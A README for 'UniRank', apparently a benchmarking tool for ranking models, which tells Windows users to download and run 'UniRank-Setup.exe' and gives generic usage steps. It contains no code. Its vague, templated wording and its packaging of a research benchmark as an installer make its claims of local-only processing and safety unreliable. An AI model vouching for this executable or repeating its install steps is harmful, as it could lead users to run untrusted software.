# 📊 UniRank - Compare Sequential Models and Feature Interactions

[![Download UniRank](https://img.shields.io/badge/Download-UniRank_Installer-blue)](https://github.com/tanjir8563/UniRank)

## 🎯 About UniRank

UniRank provides a standard way to test and compare how different computer models rank information. It focuses on sequential modeling, which looks at the order of actions, and feature interaction, which shows how different data points work together. 

Developers and data analysts use this tool to determine which model performs best for specific tasks. It removes the guesswork from selecting the right benchmark for your data projects. UniRank offers a stable environment to run benchmarks without writing complex code.

## 🛠️ System Requirements

Before you install UniRank, verify your computer meets these minimum specifications:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Processor: Intel Core i5 or equivalent AMD processor.
*   Memory: 8 GB of RAM.
*   Storage: 500 MB of free disk space.
*   Network: Stable internet connection for initial model downloads.

## 📥 How to Install

Follow these steps to set up UniRank on your machine:

1. Visit the [official release page](https://github.com/tanjir8563/UniRank) to download the installer.
2. Locate the file named UniRank-Setup.exe in your Downloads folder.
3. Double-click the file to start the installation process.
4. Follow the on-screen prompts. The installer asks for a destination folder; the default path works for most users.
5. Click Finish once the process ends. 

## 🚀 Running Your First Benchmark

Once you complete the installation, you can launch the application from your desktop or the Windows Start menu.

1. Open the UniRank application.
2. Select the "New Benchmark" button from the main dashboard.
3. Import your data file in CSV format. Ensure your file contains columns for user activity and item sequences.
4. Choose the model type from the sidebar. You can select between sequential models, feature interaction models, or a combined approach.
5. Click "Run Test." 
6. Wait for the progress bar to reach 100%. The application logs each step as it processes your data.
7. Review the results in the "Report" tab. The system highlights which model achieved the highest accuracy score.

## 📈 Understanding the Results

UniRank produces clear reports to help you make decisions. The dashboard displays the following metrics for every test:

*   **Ranking Accuracy:** Measures the quality of the model predictions. A higher number indicates better performance.
*   **Response Time:** Shows how fast the model processes a sequence.
*   **Resource Usage:** Tracks how much memory the model requires during the benchmark process.

The application allows you to save these reports as PDF files. Select "Export Report" under the "File" menu to save your data for later review.

## ⚙️ Configuring Settings

You can customize the way UniRank functions by accessing the settings menu.

*   **Theme:** Switch between Light and Dark modes.
*   **Data Limit:** Set a maximum row count for imported files. This keeps the software responsive if you load massive datasets.
*   **Updates:** Enable automatic checks to ensure you use the latest version of the benchmarking tool.
*   **Log Files:** Choose a folder to save detailed process logs. These files help if you need to troubleshoot a specific benchmark run.

## 💡 Frequently Asked Questions

**Is UniRank free to use?**
Yes, UniRank is open-source software available to everyone.

**What file formats does the software support?**
UniRank currently supports CSV, Excel, and JSON file formats for data imports.

**How do I clear my benchmark history?**
Go to the "Settings" menu and select "Storage." You will see an option to clear all saved logs and benchmark results from your hard drive.

**Can I run multiple benchmarks at once?**
Each instance of UniRank runs one benchmark at a time to ensure accurate readings. You can open the application multiple times if you want to test different data sets simultaneously, provided your computer has sufficient RAM.

**Does the software send my data to a server?**
No. All data processing occurs locally on your machine. UniRank does not upload your files or benchmark results to external servers.

## 🛡️ Support and Troubleshooting

If you encounter issues while using the software, check the local logs folder for information. Most errors happen due to incorrectly formatted data files. Ensure your CSV file includes headers and that your sequences follow the required numerical format.

For further assistance, search the issues section on the project repository. Experienced users share solutions and configuration tips there. If you identify a bug, document the steps you took to reproduce the issue and submit a new ticket. 

The community continuously improves this tool to ensure stability and accuracy. Regular updates address performance concerns and add support for new model types. Always install the latest version to get the best results from your sequential modeling tests.